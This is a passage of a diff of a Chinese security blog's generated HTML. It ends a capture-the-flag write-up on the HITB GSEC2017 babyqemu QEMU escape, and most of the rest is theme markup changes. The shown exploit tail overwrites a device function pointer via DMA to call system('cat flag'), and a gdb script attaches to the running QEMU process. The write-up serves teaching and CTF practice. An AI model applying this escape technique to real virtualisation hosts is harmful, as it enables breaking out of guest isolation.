ptr</span></span><br><span class="line">    dma_do_write(<span class="number">0x1000</span> + DMABASE, &amp;system_plt, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// deply the parameter of system function</span></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;cat flag\x00&quot;</span>;</span><br><span class="line">    dma_do_write(<span class="number">0x200</span> + DMABASE, command, <span class="built_in">strlen</span>(command));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger the enc ptr to execute system</span></span><br><span class="line">    dma_do_enc(<span class="number">0x200</span> + DMABASE, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230205170230132.png"
-                      alt="image-20230205170230132"
-                ></p>
+<p><img   src="/images/image-20230205170230132.png"  alt="image-20230205170230132"></p>
 <p>调试脚本：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">pid=`ps -aux | grep <span class="string">&quot;qemu-system-x86_64&quot;</span> | grep -v <span class="string">&quot;grep&quot;</span> | awk <span class="string">&#x27;&#123;print($2)&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">sudo gdb \</span><br><span class="line">-ex <span class="string">&quot;file qemu-system-x86_64&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;attach <span class="variable">$pid</span>&quot;</span> \</span><br><span class="line">-ex <span class="string">&quot;b*\$rebase(0x284191)&quot;</span></span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230205173312988.png"
-                      alt="image-20230205173312988"
-                ></p>
+<p><img   src="/images/image-20230205173312988.png"  alt="image-20230205173312988"></p>
 <hr>
 <p>题目地址：<a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz" >https://github.com/196082/196082/blob/main/qemu_escape/HITB%20GSEC2017_babyqemu.tar.gz<i class="fas fa-external-link-alt"></i></a></p>
 <p>参考链接：</p>
@@ -399,197 +424,285 @@
 <p><a class="link"   target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup" >https://ray-cp.github.io/archivers/qemu-pwn-hitb-gesc-2017-babyqemu-writeup<i class="fas fa-external-link-alt"></i></a></p>
 <p><a class="link"   target="_blank" rel="noopener" href="https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio" >https://ray-cp.github.io/archivers/qemu-pwn-basic-knowledge#%E8%AE%BF%E9%97%AEmmio<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/03/15/q-escape/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">q-escape</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/qemu-escape/">qemu escape</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2023/01/11/d3bpf-v2/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">d3bpf-v2</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/03/15/q-escape/"
+                                   title="q-escape"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">q-escape</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/01/11/d3bpf-v2/"
+                                   title="d3bpf-v2"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">d3bpf-v2</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="nav-text">qemu的内存结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu%E7%9A%84%E5%9C%B0%E5%9D%80%E8%BD%AC%E5%8C%96"><span class="nav-text">qemu的地址转化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCI%E8%AE%BE%E5%A4%87"><span class="nav-text">PCI设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mmio"><span class="nav-text">mmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pmio"><span class="nav-text">pmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lspci"><span class="nav-text">lspci</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITB-GSEC2017-babyqemu"><span class="nav-text">HITB GSEC2017 babyqemu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="nav-text">分析函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞分析与利用</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -598,13 +711,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -618,42 +730,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="nav-text">qemu的内存结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu%E7%9A%84%E5%9C%B0%E5%9D%80%E8%BD%AC%E5%8C%96"><span class="nav-text">qemu的地址转化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCI%E8%AE%BE%E5%A4%87"><span class="nav-text">PCI设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mmio"><span class="nav-text">mmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pmio"><span class="nav-text">pmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lspci"><span class="nav-text">lspci</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITB-GSEC2017-babyqemu"><span class="nav-text">HITB GSEC2017 babyqemu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="nav-text">分析函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞分析与利用</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -671,7 +786,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -685,29 +800,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84"><span class="nav-text">qemu的内存结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#qemu%E7%9A%84%E5%9C%B0%E5%9D%80%E8%BD%AC%E5%8C%96"><span class="nav-text">qemu的地址转化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PCI%E8%AE%BE%E5%A4%87"><span class="nav-text">PCI设备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mmio"><span class="nav-text">mmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pmio"><span class="nav-text">pmio</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lspci"><span class="nav-text">lspci</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HITB-GSEC2017-babyqemu"><span class="nav-text">HITB GSEC2017 babyqemu</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="nav-text">分析程序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E5%87%BD%E6%95%B0"><span class="nav-text">分析函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞分析与利用</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
